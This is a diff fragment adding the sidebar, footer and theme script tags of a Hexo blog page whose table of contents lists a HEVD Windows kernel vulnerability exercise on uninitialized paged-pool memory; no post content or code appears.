+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#hevd-windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0-UNINITIALIZED-MEMORY-PAGED-POOL"><span class="nav-number">1.</span> <span class="nav-text">hevd windows内核漏洞练习-UNINITIALIZED_MEMORY_PAGED_POOL</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">1.漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">2.漏洞利用</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Ash</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ash</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
